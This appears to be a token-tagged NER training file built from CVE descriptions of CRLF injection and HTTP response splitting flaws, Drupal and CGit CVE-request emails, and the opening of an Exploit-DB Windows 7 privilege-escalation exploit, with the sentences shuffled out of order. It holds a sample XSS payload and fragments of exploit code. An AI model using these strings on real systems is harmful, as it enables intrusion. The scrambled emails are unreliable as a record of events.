Promise O
Technology O
WebPam O
Pro-E O
devices O
allow O
remote O
attackers O
to O
conduct O
XSS O
, O
HTTP O
Response O
Splitting O
, O
and O
CRLF O
Injection O
attacks O
via O
JavaScript O
code O
in O
a O
PHPSESSID O
cookie O
. O

Cisco O
Bug O
IDs O
: O
CSCvf16705 O
. O

An O
attacker O
could O
exploit O
this O
vulnerability O
by O
injecting O
malicious O
HTTP O
headers O
, O
controlling O
the O
response O
body O
, O
or O
splitting O
the O
response O
into O
multiple O
responses O
. O

An O
exploit O
could O
allow O
the O
attacker O
to O
perform O
cross-site O
scripting O
attacks O
, O
cross-user O
defacement O
, O
web O
cache O
poisoning O
, O
and O
similar O
exploits O
. O

The O
vulnerability O
is O
due O
to O
the O
failure O
of O
the O
application O
or O
its O
environment O
to O
properly O
sanitize O
input O
values O
. O

A O
vulnerability O
in O
the O
Cisco O
Email O
Security O
Appliance O
( O
ESA O
) O
could O
allow O
an O
unauthenticated O
, O
remote O
attacker O
to O
conduct O
a O
HTTP O
response O
splitting O
attack O
. O

setup/controllers/language.php O
in O
MODX SN
Revolution SN
2.5.4-pl SV
and SV
earlier SV
does O
not O
properly O
constrain O
the O
language O
parameter O
, O
which O
allows O
remote O
attackers O
to O
conduct O
Cookie-Bombing O
attacks O
and O
cause O
a O
denial O
of O
service O
( O
cookie O
quota O
exhaustion O
) O
, O
or O
conduct O
HTTP O
Response O
Splitting O
attacks O
with O
resultant O
XSS O
, O
via O
an O
invalid O
parameter O
value O
. O

IBM O
X-Force O
ID O
: O
129578 O
. O

IBM SN
WebSphere SN
Application SN
Server SN
7.0 SV
, O
8.0 SV
, O
8.5 SV
, O
and SV
9.0 SV
is O
vulnerable O
to O
HTTP O
response O
splitting O
attacks O
. O

A O
remote O
attacker O
could O
exploit O
this O
vulnerability O
using O
specially-crafted O
URL O
to O
cause O
the O
server O
to O
return O
a O
split O
response O
, O
once O
the O
URL O
is O
clicked O
. O

This O
would O
allow O
the O
attacker O
to O
perform O
further O
attacks O
, O
such O
as O
Web O
cache O
poisoning O
, O
cross-site O
scripting O
, O
and O
possibly O
obtain O
sensitive O
information O
. O

IBM O
X-Force O
ID O
: O
125152 O
. O

IBM SN
Maximo SN
Asset SN
Management SN
7.5 SV
and SV
7.6 SV
is O
vulnerable O
to O
HTTP O
response O
splitting O
attacks O
. O

IBM SN
Security SN
Guardium SN
10.0 SV
is O
vulnerable O
to O
HTTP O
response O
splitting O
attacks O
. O

IBM O
X-Force O
ID O
: O
124737 O
. O

Accepting O
these O
different O
behaviors O
represented O
a O
security O
concern O
when O
httpd O
participates O
in O
any O
chain O
of O
proxies O
or O
interacts O
with O
back-end O
application O
servers O
, O
either O
through O
mod_proxy O
or O
using O
conventional O
CGI O
mechanisms O
, O
and O
may O
result O
in O
request O
smuggling O
, O
response O
splitting O
and O
cache O
pollution O
. O

Apache SN
HTTP SN
Server SN
, O
in O
all O
releases O
prior SV
to SV
2.2.32 SV
and SV
2.4.25 SV
, O
was O
liberal O
in O
the O
whitespace O
accepted O
from O
requests O
and O
sent O
in O
response O
lines O
and O
headers O
. O

CRLF O
injection O
vulnerability O
in O
Huawei SN
FusionAccess SN
before SV
V100R006C00 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
unspecified O
vectors O
. O

CRLF O
injection O
vulnerability O
in O
the O
ServerResponse O
writeHead O
function O
in O
Node.js SN
0.10.x SV
before SV
0.10.47 SV
, O
0.12.x SV
before SV
0.12.16 SV
, O
4.x SV
before SV
4.6.0 SV
, O
and SV
6.x SV
before SV
6.7.0 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
the O
reason O
argument O
. O

CRLF O
injection O
vulnerability O
in O
the O
Undertow O
web O
server O
in O
WildFly SN
10.0.0 SV
, O
as O
used O
in O
Red SN
Hat SN
JBoss SN
Enterprise SN
Application SN
Platform SN
( O
EAP SN
) O
7.x SV
before SV
7.0.2 SV
, O
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
unspecified O
vectors O
. O

CRLF O
injection O
vulnerability O
in O
the O
drupal_set_header O
function O
in O
Drupal SN
6.x SV
before SV
6.38 SV
, O
when O
used O
with O
PHP SN
before SV
5.1.2 SV
, O
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
by O
leveraging O
a O
module O
that O
allows O
user-submitted O
data O
to O
appear O
in O
HTTP O
headers O
. O

Subject O
: O
CVE O
requests O
for O
Drupal O
core O
( O
SA-CORE-2016-001 O
) O

Date O
: O
Wed O
, O
24 O
Feb O
2016 O
21:35:17 O
+0100 O
From O
: O
Pere O
Orga O
< O
pere O
@ O
... O
a.cat O
To O
: O
oss-security O
@ O
... O
ts.openwall.com O
Cc O
: O
Drupal O
Security O
Team O
< O
security O
@ O
... O
pal.org O

Hi O
Please O
can O
I O
have O
CVE O
IDs O
assigned O
to O
the O
following O
Drupal O
vulnerabilities O
( O
see O
) O
: O
File O
upload O
access O
bypass O
and O
denial O
of O
service O
( O
File O
module O
- O
Drupal O
7 O
and O
8 O
) O
Brute O
force O
amplification O
attacks O
via O
XML-RPC O
( O
XML-RPC O
server O
- O
Drupal O
6 O
and O
7 O
) O
Open O
redirect O
via O
path O
manipulation O
( O
Base O
system O
- O
Drupal O
6 O
, O
7 O
and O
8 O
) O
Form O
API O
ignores O
access O
restrictions O
on O
submit O
buttons O
( O
Form O
API O
- O
Drupal O
6 O
) O
HTTP O
header O
injection O
using O
line O
breaks O
( O
Base O
system O
- O
Drupal O
6 O
) O
Open O
redirect O
via O
double-encoded O
destination O
parameter O
( O
Base O
system O
- O
Drupal O
6 O
) O
Reflected O
file O
download O
vulnerability O
( O
System O
module O
- O
Drupal O
6 O
and O
7 O
) O
Saving O
user O
accounts O
can O
sometimes O
grant O
the O
user O
all O
roles O
( O
User O
module O
- O
Drupal O
6 O
and O
7 O
) O
Email O
address O
can O
be O
matched O
to O
an O
account O
( O
User O
module O
- O
Drupal O
7 O
and O
8 O
) O
Session O
data O
truncation O
can O
lead O
to O
unserialization O
of O
user O
provided O
data O
( O
Base O
system O
- O
Drupal O
6 O
) O
And O
also O
for O
the O
FileField O
contributed O
module O
: O
FileField O
- O
Denial O
of O
Service O
Regards O
Pere O
Orga O
on O
behalf O
of O
the O
Drupal O
Security O
team O

Use O
CVE-2016-3170 O
. O

This O
issue O
is O
mitigated O
by O
the O
fact O
that O
it O
requires O
an O
unusual O
set O
of O
circumstances O
to O
exploit O
and O
depends O
on O
the O
particular O
Drupal O
code O
that O
is O
running O
on O
the O
site O
. O

Form O
API O
ignores O
access O
restrictions O
on O
submit O
buttons O
( O
Form O
API O
- O
Drupal O
6 O
- O
Critical O
) O
An O
access O
bypass O
vulnerability O
was O
found O
that O
allows O
input O
to O
be O
submitted O
, O
for O
example O
using O
JavaScript O
, O
for O
form O
button O
elements O
that O
a O
user O
is O
not O
supposed O
to O
have O
access O
to O
because O
the O
button O
was O
blocked O
by O
setting O
access O
to O
FALSE O
in O
the O
server-side O
form O
definition O
. O

This O
vulnerability O
is O
mitigated O
by O
the O
fact O
that O
it O
would O
only O
occur O
in O
combination O
with O
custom O
code O
, O
or O
in O
certain O
cases O
if O
a O
user O
submits O
a O
form O
shown O
on O
a O
404 O
page O
with O
a O
specially O
crafted O
URL O
. O

This O
vulnerability O
is O
mitigated O
by O
that O
fact O
that O
the O
attack O
is O
not O
possible O
for O
sites O
running O
on O
PHP O
5.4.7 O
or O
greater O
. O

This O
vulnerability O
is O
mitigated O
by O
the O
fact O
that O
the O
attacker O
must O
have O
access O
to O
submit O
a O
form O
that O
has O
such O
buttons O
defined O
for O
it O
( O
for O
example O
, O
a O
form O
that O
both O
administrators O
and O
non-administrators O
can O
access O
, O
but O
where O
administrators O
have O
additional O
buttons O
available O
to O
them O
) O
. O

Use O
CVE-2016-3166 O
. O

This O
can O
lead O
to O
Open O
Redirect O
vulnerabilities O
. O

Use O
CVE-2016-3168 O
. O

This O
issue O
is O
mitigated O
by O
the O
fact O
that O
it O
requires O
a O
contributed O
module O
to O
be O
installed O
that O
permits O
logging O
in O
with O
an O
email O
address O
, O
and O
that O
it O
is O
only O
relevant O
on O
sites O
where O
usernames O
are O
typically O
chosen O
to O
hide O
the O
users O
real-life O
identities O
. O

It O
is O
also O
believed O
to O
be O
mitigated O
by O
upgrading O
to O
PHP O
5.4.45 O
, O
5.5.29 O
, O
5.6.13 O
, O
or O
any O
higher O
version O
. O

It O
is O
additionally O
mitigated O
if O
flood O
control O
protection O
is O
in O
place O
for O
the O
method O
in O
question O
. O

HTTP O
header O
injection O
using O
line O
breaks O
( O
Base O
system O
- O
Drupal O
6 O
- O
Moderately O
Critical O
) O
A O
vulnerability O
in O
the O
drupal_set_header O
( O
) O
function O
allows O
an O
HTTP O
header O
injection O
attack O
to O
be O
performed O
if O
user-generated O
content O
is O
passed O
as O
a O
header O
value O
on O
sites O
running O
PHP SN
versions O
older SV
than SV
5.1.2 SV
. O

This O
vulnerability O
is O
mitigated O
by O
the O
fact O
that O
the O
attacker O
must O
have O
permission O
to O
create O
content O
or O
comment O
and O
upload O
files O
as O
part O
of O
that O
process O
. O

This O
issue O
is O
mitigated O
by O
the O
fact O
that O
it O
requires O
contributed O
or O
custom O
code O
that O
calls O
user_save O
( O
) O
with O
an O
explicit O
category O
and O
code O
that O
loads O
all O
roles O
into O
the O
array O
. O

Use O
CVE-2016-3162 O
. O

This O
vulnerability O
is O
mitigated O
by O
the O
fact O
that O
most O
hosts O
have O
newer O
versions O
of O
PHP O
installed O
, O
and O
that O
it O
requires O
a O
module O
to O
be O
installed O
on O
the O
site O
that O
allows O
user-submitted O
data O
to O
appear O
in O
HTTP O
headers O
. O

Date O
: O
Tue O
, O
15 O
Mar O
2016 O
19:02:25 O
-0400 O
( O
EDT O
) O
From O
: O
cve-assign O
@ O
... O
re.org O
To O
: O
pere O
@ O
... O
a.cat O
Cc O
: O
cve-assign O
@ O
... O
re.org O
, O
oss-security O
@ O
... O
ts.openwall.com O
, O
security O
@ O
... O
pal.org O

Use O
CVE-2016-3171 O
. O

- O
CVE O
Assignment O
Team O
M/S O
M300 O
, O
202 O
Burlington O
Road O
, O
Bedford O
, O
MA O
01730 O
USA O
[ O
A O
PGP O
key O
is O
available O
for O
encrypted O
communications O
at O
] O
BEGIN O
PGP O
SIGNATURE O
Version O
: O
GnuPG O
v1 O
iQIcBAEBCAAGBQJW6JQLAAoJEL54rhJi8gl5ySQQAI4bneFzYhM+2x9p8M9zDwF0 O
qZbMerp4yXeB+w4ejBBUv73k03xXveRwOabDiT0N4Rub/njlUUhmqtOLHuOZ21WU O
wYPGYxZHEVLmsiDCYu6W55aE114CywC+uWEay6o6Nk55y5EGRrZzwQjYPwSJdbl+ O
/D4ArePHQkw5+mclilaFVKvhd8t01AVaH8x5cyfGYTZVJRjL6O6032fEbTgGcz6c O
mEZ2cpHZYsOAvn5I0i0SKq5xTK3UK+mzt23n8toP2k2E9bFOjqIej49hQMsIKF0O O
ixZn1J08J5stumLUDPMcu1L1kwr5/6+C24f5Um67q0zlL5W6jshpUUzXXe4nxBom O
vr9cC2hqMk1tkjBmKvylS7BLk5VblL8rSsUjZ6UxbL+gvusdblPnTpzvw1ldlG61 O
fgp5e27yOFYKuOrd6/OO79zmJFGWo+mRweumJOZpKdP8H4x58IMF5eZSzFhVSuzS O
EVKFKOHVwPVF1nQ3j81KyDxe4vNtCCjIy6eKJyctkHMn8Q21VlkTGjvDVcO8qfOA O
oUV/JKn2ad/Pl4TN4LDT6KDss6zHCM+EvlX+mLdy4Oa13rs+N29Ek5VxLGjaEe9p O
77yXCYPIO64dxUqlU+/bKH3f/fRBDv0fjLt3nWUol0e26RTmAbIn/T6xRdFCB2Qb O
infW+eF3l8hqc0Y9K27J O
=f4nY O
END O
PGP O
SIGNATURE O

For O
Drupal O
8 O
this O
is O
a O
hardening O
against O
possible O
browser O
flaws O
handling O
certain O
redirect O
paths O
. O

Use O
CVE-2016-3163 O
. O

Use O
CVE-2016-3164 O
. O

Saving O
user O
accounts O
can O
sometimes O
grant O
the O
user O
all O
roles O
( O
User O
module O
- O
Drupal O
6 O
and O
7 O
- O
Less O
Critical O
) O
Some O
specific O
contributed O
or O
custom O
code O
may O
call O
Drupal O
user_save O
( O
) O
API O
in O
a O
manner O
different O
than O
Drupal O
core O
. O

( O
This O
issue O
has O
a O
CVE O
ID O
because O
the O
Drupal O
vendor O
has O
issued O
a O
security O
advisory O
. O

If O
the O
content O
contains O
line O
breaks O
the O
user O
may O
be O
able O
to O
set O
arbitrary O
headers O
of O
their O
own O
choosing O
. O

This O
vulnerability O
is O
mitigated O
by O
the O
fact O
that O
the O
victim O
must O
be O
a O
site O
administrator O
and O
that O
the O
full O
version O
of O
the O
attack O
only O
works O
with O
certain O
web O
browsers O
. O

Email O
address O
can O
be O
matched O
to O
an O
account O
( O
User O
module O
- O
Drupal O
7 O
and O
8 O
- O
Less O
Critical O
) O
In O
certain O
configurations O
where O
a O
user O
email O
addresses O
could O
be O
used O
to O
log O
in O
instead O
of O
their O
username O
, O
links O
to O
have O
you O
forgotten O
your O
password O
could O
reveal O
the O
username O
associated O
with O
a O
particular O
email O
address O
, O
leading O
to O
an O
information O
disclosure O
vulnerability O
. O

There O
are O
no O
such O
modules O
in O
Drupal O
7 O
core O
, O
but O
Drupal O
6 O
core O
is O
vulnerable O
via O
the O
Blog O
API O
module O
. O

We O
may O
be O
sending O
a O
separate O
reply O
about O
the O
And O
also O
for O
the O
FileField O
contributed O
module O
part O
. O

Use O
CVE-2016-3167 O
. O

Subject O
: O
Re O
: O
CVE O
requests O
for O
Drupal O
core O
( O
SA-CORE-2016-001 O
) O
BEGIN O
PGP O
SIGNED O
MESSAGE O
Hash O
: O
SHA256 O
File O
upload O
access O
bypass O
and O
denial O
of O
service O
( O
File O
module O
- O
Drupal O
7 O
and O
8 O
- O
Moderately O
Critical O
) O
A O
vulnerability O
exists O
in O
the O
File O
module O
that O
allows O
a O
malicious O
user O
to O
view O
, O
delete O
or O
substitute O
a O
link O
to O
a O
file O
that O
the O
victim O
has O
uploaded O
to O
a O
form O
while O
the O
form O
has O
not O
yet O
been O
submitted O
and O
processed O
. O

Use O
CVE-2016-3169 O
. O

Open O
redirect O
via O
path O
manipulation O
( O
Base O
system O
- O
Drupal O
6 O
, O
7 O
and O
8 O
- O
Moderately O
Critical O
) O
In O
Drupal SN
6 SV
and SV
7 SV
, O
the O
current O
path O
can O
be O
populated O
with O
an O
external O
URL O
. O

This O
vulnerability O
is O
mitigated O
by O
the O
fact O
that O
you O
must O
have O
enabled O
a O
module O
that O
provides O
an O
XML-RPC O
method O
that O
is O
vulnerable O
to O
brute-forcing O
. O

Depending O
on O
the O
data O
that O
has O
been O
added O
to O
a O
form O
or O
the O
array O
prior O
to O
saving O
, O
this O
can O
lead O
to O
a O
user O
gaining O
all O
roles O
on O
a O
site O
. O

Use O
CVE-2016-3165 O
. O

Brute O
force O
amplification O
attacks O
via O
XML-RPC O
( O
XML-RPC O
server O
- O
Drupal O
6 O
and O
7 O
- O
Moderately O
Critical O
) O
The O
XML-RPC O
system O
allows O
a O
large O
number O
of O
calls O
to O
the O
same O
method O
to O
be O
made O
at O
once O
, O
which O
can O
be O
used O
as O
an O
enabling O
factor O
in O
brute O
force O
attacks O
( O
for O
example O
, O
attempting O
to O
determine O
user O
passwords O
by O
submitting O
a O
large O
number O
of O
password O
variations O
at O
once O
) O
. O

If O
an O
attacker O
carries O
out O
this O
attack O
continuously O
, O
all O
file O
uploads O
to O
a O
site O
could O
be O
blocked O
by O
deleting O
all O
temporary O
files O
before O
they O
can O
be O
saved O
. O

Subject O
: O
Re O
: O
CVE O
requests O
for O
Drupal O
core O
( O
SA-CORE-2016-001 O
) O

The O
HTTP O
header O
parsing O
code O
in O
Node.js SN
0.10.x SV
before SV
0.10.42 SV
, O
0.11.6 SV
through SV
0.11.16 SV
, O
0.12.x SV
before SV
0.12.10 SV
, O
4.x SV
before SV
4.3.0 SV
, O
and SV
5.x SV
before SV
5.6.0 SV
allows O
remote O
attackers O
to O
bypass O
an O
HTTP O
response-splitting O
protection O
mechanism O
via O
UTF-8 O
encoded O
Unicode O
characters O
in O
the O
HTTP O
header O
, O
as O
demonstrated O
by O
% O
c4 O
% O
8d O
% O
c4 O
% O
8a O
. O

CRLF O
injection O
vulnerability O
in O
the O
ui-blob O
handler O
in O
CGit SN
before SV
0.12 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
or O
cross-site O
scripting O
( O
XSS O
) O
attacks O
via O
CRLF O
sequences O
in O
the O
mimetype O
parameter O
, O
as O
demonstrated O
by O
a O
request O
to O
blob/cgit.c O
. O

Subject O
: O
CVE O
Request O
: O
CGit O
- O
Multiple O
vulnerabilities O

This O
has O
been O
fixed O
by O
adding O
a O
configuration O
option O
, O
enable-html-serving O
, O
which O
is O
by O
default O
off O
: O
This O
flag O
sets O
anti-sniffing O
, O
CSP O
, O
and O
restricts O
mimetypes O
to O
non- O
application O
( O
except O
for O
application/pdf O
and O
application/octet-stream O
) O
and O
non- O
text O
( O
except O
for O
text/plain O
) O
. O

This O
has O
been O
fixed O
by O
this O
commit O
: O
A O
new O
version O
containing O
these O
security O
fixes O
will O
be O
published O
shortly O
. O

Thanks O
, O
Jason O

Hi O
folks O
, O
Krzysztof O
Katowicz-Kowalewski O
from O
ESET O
, O
Erik O
Cabetas O
from O
Include O
Security O
, O
and O
myself O
( O
Jason O
Donenfeld O
) O
from O
Edge O
Security O
, O
have O
found O
a O
few O
vulnerabilities O
in O
CGit O
: O
1 O
. O

While O
this O
is O
ordinarily O
not O
a O
problem O
for O
single-use O
users O
- O
and O
indeed O
some O
users O
rather O
like O
being O
able O
to O
serve O
html O
from O
cgit O
- O
sites O
that O
allow O
potentially O
malicious O
third O
party O
users O
may O
not O
find O
this O
behavior O
desirable O
. O

Integer O
Overflow O
resulting O
in O
Buffer O
Overflow O
[ O
Cabetas O
] O
ctx.env.content_length O
is O
an O
unsigned O
int O
, O
coming O
from O
the O
CONTENT_LENGTH O
environment O
variable O
, O
which O
is O
parsed O
by O
strtoul O
. O

This O
has O
been O
fixed O
by O
properly O
escaping O
filenames O
in O
headers O
: O
Additionally O
, O
while O
the O
redirect O
for O
the O
/about O
- O
/about O
page O
does O
not O
appear O
to O
be O
vulnerable O
due O
to O
mitigating O
conditions O
, O
the O
following O
commit O
was O
made O
to O
similarly O
harden O
potential O
injections O
here O
: O
3 O
. O

Stored O
Cross O
Site O
Scripting O
in O
Git O
Repo O
Files O
[ O
Katowicz-Kowalewski O
] O
A O
user O
who O
has O
write O
access O
to O
the O
git O
repository O
can O
add O
HTML O
pages O
and O
then O
serve O
them O
with O
an O
HTML O
mimetype O
. O

Date O
: O
Thu O
, O
14 O
Jan O
2016 O
15:21:36 O
+0100 O
From O
: O
Jason O
A. O
Donenfeld O
< O
Jason O
@ O
... O
c4.com O
To O
: O
cgit O
@ O
... O
ts.zx2c4.com O
< O
cgit O
@ O
... O
ts.zx2c4.com O
> O
, O
oss-security O
< O
oss-security O
@ O
... O
ts.openwall.com O
Cc O
: O
Daniel O
Chromek O
< O
chromek O
@ O
... O
t.sk O
> O
, O
Krzysztof O
Katowicz-Kowalewski O
< O
krzysztof.kowalewski O
@ O
... O
t.pl O
> O
, O
Erik O
Cabetas O
< O
erik O
@ O
... O
ludesecurity.com O
> O
, O
Konstantin O
Ryabitsev O
< O
mricon O
@ O
... O
nel.org O

The O
HTTP/1.1 O
spec O
says O
that O
any O
Content-Length O
greater O
than O
or O
equal O
to O
zero O
is O
a O
valid O
value O
. O

Stored O
Cross O
Site O
Scripting O
& O
Header O
Injection O
in O
Filename O
Parameter O
[ O
Donenfeld O
] O
A O
user O
who O
has O
write O
access O
to O
the O
git O
repository O
could O
create O
filenames O
containing O
new O
lines O
that O
would O
result O
in O
that O
filename O
, O
including O
the O
newlines O
, O
being O
included O
in O
a O
header O
, O
resulting O
in O
header O
injection O
and O
eventually O
XSS O
. O

A O
user O
could O
therefore O
upload O
pages O
with O
malicious O
javascript O
executing O
in O
the O
same O
origin O
as O
the O
cgit O
web O
site O
. O

Reflected O
Cross O
Site O
Scripting O
& O
Header O
Injection O
in O
Mimetype O
Query O
String O
[ O
Katowicz-Kowalewski O
] O
The O
ui-blob O
handler O
accepted O
a O
mimetype O
as O
a O
query O
string O
and O
then O
echoed O
this O
string O
verbatim O
back O
. O

If O
you O
have O
a O
better O
idea O
of O
what O
sort O
of O
white/black O
list O
to O
use O
for O
this O
, O
I O
am O
open O
to O
suggestions O
. O

By O
storing O
this O
unsigned O
int O
into O
an O
int O
, O
we O
potentially O
overflow O
it O
, O
resulting O
in O
the O
following O
bounding O
check O
failing O
, O
leading O
to O
a O
buffer O
overflow O
. O

A O
malicious O
user O
could O
provide O
a O
string O
like O
: O
< O
script O
> O
xss O
< O
/script O
This O
has O
been O
fixed O
by O
removing O
support O
for O
the O
mimetype O
query O
string O
parameter O
: O
And O
then O
restricting O
to O
only O
generic O
mimetypes O
: O
And O
finally O
, O
just O
in O
case O
, O
setting O
the O
IE O
anti-sniffing O
header O
as O
well O
as O
a O
restrictive O
CSP O
header O
: O
2 O
. O

However O
, O
we O
typically O
don O
t O
want O
to O
have O
a O
CVE O
for O
a O
design O
change O
that O
probably O
breaks O
a O
number O
of O
existing O
installations O
unless O
reconfigured O
. O

This O
has O
been O
fixed O
by O
properly O
escaping O
filenames O
in O
headers O
: O
Use O
CVE-2016-1900 O
. O

And O
then O
restricting O
to O
only O
generic O
mimetypes O
: O
And O
finally O
, O
just O
in O
case O
, O
setting O
the O
IE O
anti-sniffing O
header O
as O
well O
as O
a O
restrictive O
CSP O
header O
: O
There O
is O
no O
CVE O
ID O
associated O
with O
either O
of O
these O
other O
changes O
, O
which O
seem O
to O
be O
for O
defense-in-depth O
purposes O
. O

Subject O
: O
Re O
: O
CVE O
Request O
: O
CGit O
- O
Multiple O
vulnerabilities O
BEGIN O
PGP O
SIGNED O
MESSAGE O
Hash O
: O
SHA256 O
1 O
. O

Date O
: O
Thu O
, O
14 O
Jan O
2016 O
11:55:46 O
-0500 O
( O
EST O
) O
From O
: O
cve-assign O
@ O
... O
re.org O
To O
: O
Jason O
@ O
... O
c4.com O
Cc O
: O
cve-assign O
@ O
... O
re.org O
, O
oss-security O
@ O
... O
ts.openwall.com O
, O
krzysztof.kowalewski O
@ O
... O
t.pl O
, O
erik O
@ O
... O
ludesecurity.com O

There O
is O
no O
CVE O
ID O
associated O
with O
this O
report O
, O
which O
seems O
to O
be O
about O
adding O
new O
security-related O
functionality O
. O

A O
malicious O
user O
could O
provide O
a O
string O
like O
: O
< O
script O
> O
xss O
< O
/script O
This O
has O
been O
fixed O
by O
removing O
support O
for O
the O
mimetype O
query O
string O
parameter O
: O
Use O
CVE-2016-1899 O
. O

- O
CVE O
assignment O
team O
, O
MITRE O
CVE O
Numbering O
Authority O
M/S O
M300 O
202 O
Burlington O
Road O
, O
Bedford O
, O
MA O
01730 O
USA O
[ O
PGP O
key O
available O
through O
] O
BEGIN O
PGP O
SIGNATURE O
Version O
: O
GnuPG O
v1 O
iQIcBAEBCAAGBQJWl9JtAAoJEL54rhJi8gl5lQEP/RNIfyGohJ7Z/SHub/OW/Bl0 O
39LctMT9FcOTD6WBIvub4bWE6Q/c2FlWfDjeier2cO+pm3xJnXZEvGDMxZEI2wYI O
ErO9spu++XX6JDak0Il9fdxPTTzjSJj+c+8O8fKI3mJyUVxNhmWYUxIdG83or9zx O
ZUko+9LmXStUliIwG7FKGdqbP9gHvFI+ZLdfwtPomNJs9MEzJPipOEuSh6/Ia822 O
4rXxn9Jb+wCVWdIhsaGUkuM4wq2SZsMcpJ13ww4IOOnCErfDKbRrODXvt03MRwyE O
yE0R7aI0RoSzqzUAyiqJZZfgVgrPl1Ofx3n6mnbV3Y93Ypo8MparXUXf7+LDTT7I O
Q9M7CWc5YYOnRBg12XFaUmJY25UQRlc4PjVUpX6DZY2vyzuO8cj3k64Vi4wcQ/Nc O
OtyqNuKUJMPH77mVmMZHy7jfbtq/I20H34B57+jfBkCyLs50tQAP+8EAze0yEFF4 O
ZXv87eMrUNJJu/qOoZeJaf57PAzuFaoANtYBQ+p/hUfMwsm8iGoy6Ko0ZXO3ZW3k O
9kACdNt3QX0OfNVLws2r6qr+CFERrHMp+ha6JZbBFGAPNO4QP9ATzaixQzJ76nSU O
pPrqObQ6H58Mmq+ACRtBTNLVnccMNLsMDPgSWeLmlXZpe5DP/EPyQuSduC7gDkB O
8Td7FtAmzPUi1aORc6OK O
=F6i1 O
END O
PGP O
SIGNATURE O

We O
realize O
that O
other O
perspectives O
may O
have O
existed O
, O
especially O
because O
the O
attacker O
for O
both O
2 O
and O
3 O
is O
A O
user O
who O
has O
write O
access O
to O
the O
git O
repository O
. O

Additionally O
, O
while O
the O
redirect O
for O
the O
/about O
- O
/about O
page O
does O
not O
appear O
to O
be O
vulnerable O
due O
to O
mitigating O
conditions O
, O
the O
following O
commit O
was O
made O
to O
similarly O
harden O
potential O
injections O
here O
: O
There O
is O
no O
CVE O
ID O
associated O
with O
this O
additional O
issue O
. O

This O
has O
been O
fixed O
by O
this O
commit O
: O
Use O
CVE-2016-1901 O
. O

Also O
, O
it O
seems O
that O
another O
possibility O
may O
have O
been O
creation O
of O
a O
framework O
for O
segregating O
the O
user-uploaded O
HTML O
files O
into O
a O
different O
origin O
( O
admittedly O
this O
may O
not O
be O
worthwhile O
because O
running O
a O
cgit O
service O
with O
two O
domain O
names O
probably O
isn O
t O
what O
the O
ordinary O
cgit O
customer O
wants O
) O
. O

Subject O
: O
Re O
: O
CVE O
Request O
: O
CGit O
- O
Multiple O
vulnerabilities O

CRLF O
injection O
vulnerability O
in O
EMC SN
RSA SN
Authentication SN
Manager SN
before SV
8.1 SV
SP1 SV
P14 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
unspecified O
vectors O
. O

CRLF O
injection O
vulnerability O
in O
the O
CLI O
command O
documentation O
in O
Jenkins SN
before SV
1.650 SV
and SV
LTS SV
before SV
1.642.2 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
unspecified O
vectors O
. O

CRLF O
injection O
vulnerability O
in O
IBM SN
WebSphere SN
eXtreme SN
Scale SN
7.1.0 SV
before SV
7.1.0.3 SV
, O
7.1.1 SV
before SV
7.1.1.1 SV
, O
8.5 SV
before SV
8.5.0.3 SV
, O
and SV
8.6 SV
before SV
8.6.0.8 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
a O
crafted O
URL O
. O

Exploit O
Title O
: O
Elevation O
of O
privilege O
on O
Windows SN
7 SV
SP1 SV
x86 O
Date O
: O
28/06-2016 O
Exploit O
Author O
: O
@ O
blomster81 O

Overwrites O
HaliSystemQueryInformation O
, O
but O
does O
not O
replace O
it O
, O
so O
BSOD O
will O
occur O
at O
some O
point O
EDB O
Note O
ntos.h O
is O
available O
here O
: O
stdafx.h O
include O
< O
Windows.h O
include O
< O
winioctl.h O
include O
ntos.h O
include O
< O
TlHelp32.h O
typedef O
union O
{ O
HANDLE O
Handle O
; O
ULONG64 O
Handle64 O
; O
ULONG32 O
Handle32 O
; O
} O
HANDLE3264 O
, O
PHANDLE3264 O
; O
typedef O
struct O
{ O
ULONG O
HandleCount O
; O
ULONG O
Action O
; O
HANDLE O
PUSER_THREAD_START_ROUTINE O
UserModeCallback O
; O
HANDLE3264 O
UserModeProcess O
; O
HANDLE3264 O
Handles O
[ O
20 O
] O
; O
} O
WMIRECEIVENOTIFICATION O
, O
PWMIRECEIVENOTIFICATION O
; O
define O
RECEIVE_ACTION_CREATE_THREAD O
2 O
Mark O
guid O
objects O
as O
requiring O
typedef O
struct O
{ O
IN O
VOID O
ObjectAttributes O
; O
IN O
ACCESS_MASK O
DesiredAccess O
; O
OUT O
HANDLE3264 O
Handle O
; O
} O
WMIOPENGUIDBLOCK O
, O
PWMIOPENGUIDBLOCK O
; O
typedef O
enum O
_KPROFILE_SOURCE O
{ O
ProfileTime O
, O
ProfileAlignmentFixup O
, O
ProfileTotalIssues O
, O
ProfilePipelineDry O
, O
ProfileLoadInstructions O
, O
ProfilePipelineFrozen O
, O
ProfileBranchInstructions O
, O
ProfileTotalNonissues O
, O
ProfileDcacheMisses O
, O
ProfileIcacheMisses O
, O
ProfileCacheMisses O
, O
ProfileBranchMispredictions O
, O
ProfileStoreInstructions O
, O
ProfileFpInstructions O
, O
ProfileIntegerInstructions O
, O
Profile2Issue O
, O
Profile3Issue O
, O
Profile4Issue O
, O
ProfileSpecialInstructions O
, O
ProfileTotalCycles O
, O
ProfileIcacheIssues O
, O
ProfileDcacheAccesses O
, O
ProfileMemoryBarrierCycles O
, O
ProfileLoadLinkedIssues O
, O
ProfileMaximum O
} O
KPROFILE_SOURCE O
, O
PKPROFILE_SOURCE O
; O
typedef O
struct O
_DESKTOPINFO O
{ O
000 O
PVOID O
pvDesktopBase O
; O
008 O
PVOID O
pvDesktopLimit O
; O
} O
DESKTOPINFO O
, O
PDESKTOPINFO O
; O
typedef O
struct O
_CLIENTINFO O
{ O
000 O
DWORD O
CI_flags O
; O
